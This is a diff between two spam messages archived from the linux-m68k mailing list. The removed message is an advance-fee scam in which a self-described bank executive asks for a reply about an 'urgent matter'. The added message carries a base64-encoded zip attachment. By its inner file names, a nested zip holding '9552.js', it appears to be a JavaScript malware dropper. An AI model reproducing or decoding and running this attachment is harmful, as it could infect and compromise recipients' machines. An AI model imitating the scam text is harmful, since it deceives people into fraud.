@@ -1,23 +1,68 @@
-From: Ella Golan <dzuniga@infra.com.mx>
+From: <pekka.enne@konepajaenne.fi>
 Subject: (unknown)
-Date: Sat, 14 Oct 2017 01:44:09 -0500 (CDT)
-Message-ID: <587603753.6467496.1507963449046.JavaMail.root@infra.com.mx>
-Reply-To: ellagolan4@gmail.com
+Date: Sun, 15 Oct 2017 13:01:57 -0000
+Message-ID: <150807251793.32758.17888817983268546521@sumutprov.go.id>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="01587514.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-m68k-owner@vger.kernel.org>
+Received: from bappeda.sumutprov.go.id ([103.248.25.4]:55559 "HELO
+        sumutprov.go.id" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751333AbdJONCF (ORCPT
+        <rfc822;linux-m68k@vger.kernel.org>); Sun, 15 Oct 2017 09:02:05 -0400
 Subject: 
+Content-Disposition: attachment
 Sender: linux-m68k-owner@vger.kernel.org
 List-Id: linux-m68k@vger.kernel.org
+To: linux-m68k@vger.kernel.org
 
-
-
-I am Ms.Ella Golan, I am the Executive Vice President Banking Division with
-FIRST INTERNATIONAL BANK OF ISRAEL LTD (FIBI).
-I am getting in touch with you regarding an extremely important and urgent
-matter. If you would oblige me the opportunity, I shall provide you with
-details upon your Response...
-
-Faithfully,
-Ms.Ella Golan
+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
